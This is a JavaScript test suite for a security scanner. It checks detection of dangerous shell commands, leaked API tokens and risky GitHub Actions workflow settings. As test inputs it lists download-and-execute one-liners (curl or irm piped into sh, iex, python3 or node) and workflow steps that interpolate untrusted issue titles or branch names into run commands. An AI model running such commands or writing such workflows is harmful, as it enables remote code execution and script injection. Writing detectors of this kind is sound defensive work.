import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyDangerousCommand } from "../src/scanners/shell.js";
import { scanGitHubActions } from "../src/scanners/github-actions.js";
import { scanSecretContent } from "../src/scanners/secrets.js";
import { RULE_CATALOG } from "../src/rules.js";

const ids = (findings) => findings.map((finding) => finding.id).sort();
const workflow = (body) => scanGitHubActions(".github/workflows/t.yml", body);

// -- remote code execution variants -------------------------------------------

test("classifier flags PowerShell and substitution-based remote execution", () => {
  for (const command of [
    "irm https://x.example/install.ps1 | iex",
    "Invoke-RestMethod https://x.example/install.ps1 | Invoke-Expression",
    "iex (irm https://x.example/install.ps1)",
    "iex ((New-Object Net.WebClient).DownloadString('https://x.example/i.ps1'))",
    'bash -c "$(curl -fsSL https://x.example/i.sh)"',
    'sh -c "$(wget -qO- https://x.example/i.sh)"',
    'eval "$(curl -fsSL https://x.example/env.sh)"',
    "source <(curl -fsSL https://x.example/env.sh)"
  ]) {
    assert.deepEqual(ids(classifyDangerousCommand(command)), ["remote_code_execution"], command);
  }
});

test("classifier flags downloads piped into script interpreters that execute stdin", () => {
  assert.deepEqual(ids(classifyDangerousCommand("curl -fsSL https://x.example/i.py | python3")), ["remote_code_execution"]);
  assert.deepEqual(ids(classifyDangerousCommand("curl -fsSL https://x.example/i.py | sudo python3 -")), [
    "remote_code_execution",
    "sudo"
  ]);
  assert.deepEqual(ids(classifyDangerousCommand("wget -qO- https://x.example/i.js | node")), ["remote_code_execution"]);
});

test("classifier leaves benign downloads and data processing alone", () => {
  for (const command of [
    "curl -fsSL https://x.example/data.json | python3 -m json.tool",
    "curl -fsSL https://x.example/data.json | node transform.js",
    "curl -fsSL https://x.example/data.json | jq .",
    "curl -fsSL https://x.example/a.tgz -o a.tgz",
    'sh -c "echo $(curl -s https://x.example/ip)"',
    "irm https://x.example/api | ConvertFrom-Json"
  ]) {
    assert.deepEqual(classifyDangerousCommand(command), [], command);
  }
});

test("separators inside quoted echo text do not count as chained commands", () => {
  assert.deepEqual(classifyDangerousCommand("echo 'install with: curl https://x.example/i.sh | sh'"), []);
  assert.deepEqual(classifyDangerousCommand('echo "next run: sudo make install; then reboot"'), []);
  assert.deepEqual(classifyDangerousCommand('printf "%s\\n" "curl x | bash"'), []);
});

test("echo guard still sees commands that really execute", () => {
  assert.deepEqual(ids(classifyDangerousCommand('echo "$(curl -fsSL https://x.example/i.sh | sh)"')), [
    "remote_code_execution"
  ]);
  assert.deepEqual(ids(classifyDangerousCommand("echo done && curl -fsSL https://x.example/i.sh | sh")), [
    "remote_code_execution"
  ]);
  assert.deepEqual(ids(classifyDangerousCommand("echo 'ok' | sudo tee /etc/motd")), ["sudo"]);
});

// -- secrets ------------------------------------------------------------------

test("new token formats are detected with redacted evidence", () => {
  const alphaNum = "abcdefghijklmnopqrstuvwxyz0123456789";
  const content = [
    `fine = ${["github", "pat", "11ABCDEFG0", alphaNum + alphaNum].join("_")}`,
    `sts = ${["ASIA", "IOSFODNN7EXAMPLE"].join("")}`,
    `npm = ${["npm", alphaNum].join("_")}`,
    `hf = ${["hf", alphaNum].join("_")}`
  ].join("\n");

  const findings = scanSecretContent("src/config.js", "config.js", content);
  assert.deepEqual(ids(findings), [
    "secret.aws_access_key",
    "secret.github_token",
    "secret.huggingface_token",
    "secret.npm_token"
  ]);
  for (const finding of findings) {
    assert.equal(finding.severity, "high");
    assert.doesNotMatch(finding.evidence, /IOSFODNN7EXAMPLE|abcdefghijklmnopqrstuvwxyz0123456789/);
  }
});

test("ordinary identifiers do not look like the new token formats", () => {
  const content = [
    "const npm_config_cache = resolveCache();",
    "const hf_model_name = loadModel();",
    "const ASIA_PACIFIC_REGION = 'ap-southeast-1';",
    "const github_pat_flag = true;"
  ].join("\n");
  assert.deepEqual(scanSecretContent("src/config.js", "config.js", content), []);
});

// -- GitHub Actions -----------------------------------------------------------

test("flow-style and quoted write permissions are flagged", () => {
  const flow = workflow("on: push\npermissions: { contents: write, issues: write, pull-requests: read }\n");
  const writes = flow.filter((finding) => finding.id === "github_actions.write_permission");
  assert.deepEqual(writes.map((finding) => finding.evidence), ["contents: write", "issues: write"]);

  const quoted = workflow("on: push\npermissions:\n  contents: 'write'\n  pages: \"write\"\n");
  assert.deepEqual(
    quoted.filter((finding) => finding.id === "github_actions.write_permission").map((finding) => finding.title),
    ["GitHub Actions grants contents write permission", "GitHub Actions grants pages write permission"]
  );

  const readOnly = workflow("on: push\npermissions: { contents: read }\n");
  assert.deepEqual(readOnly, []);
});

test("block-style write permission evidence is unchanged for baseline stability", () => {
  const [finding] = workflow("on: push\npermissions:\n  contents: write # release\n");
  assert.equal(finding.evidence, "contents: write # release");
});

test("quoted persist-credentials true is flagged", () => {
  const findings = workflow(
    ["on: push", "jobs:", "  x:", "    steps:", "      - uses: actions/checkout@v7", "        with:", '          persist-credentials: "true"'].join("\n")
  );
  assert.ok(ids(findings).includes("github_actions.persist_credentials"));
});

test("untrusted context interpolated into run commands is flagged as script injection", () => {
  const inline = workflow("on: issues\njobs:\n  x:\n    steps:\n      - run: echo \"${{ github.event.issue.title }}\"\n");
  const injection = inline.find((finding) => finding.id === "github_actions.script_injection");
  assert.ok(injection);
  assert.equal(injection.severity, "high");
  assert.equal(injection.line, 5);

  const block = workflow(
    ["on: pull_request", "jobs:", "  x:", "    steps:", "      - run: |", "          git checkout ${{ github.head_ref }}", "          make"].join("\n")
  );
  const blockInjection = block.find((finding) => finding.id === "github_actions.script_injection");
  assert.ok(blockInjection);
  assert.equal(blockInjection.line, 6);
});

test("trusted context and env indirection are not script injection", () => {
  const safe = workflow(
    [
      "on: issues",
      "jobs:",
      "  x:",
      "    steps:",
      "      - run: echo \"$TITLE\"",
      "        env:",
      "          TITLE: ${{ github.event.issue.title }}",
      "      - run: echo \"${{ github.sha }} ${{ github.event.issue.number }} ${{ github.repository }}\""
    ].join("\n")
  );
  assert.ok(!ids(safe).includes("github_actions.script_injection"));
});

// -- catalog ------------------------------------------------------------------

test("every new rule id is registered in the catalog", () => {
  const catalogIds = new Set(RULE_CATALOG.map((rule) => rule.id));
  for (const id of ["secret.npm_token", "secret.huggingface_token", "github_actions.script_injection"]) {
    assert.ok(catalogIds.has(id), `${id} missing from RULE_CATALOG`);
  }
});
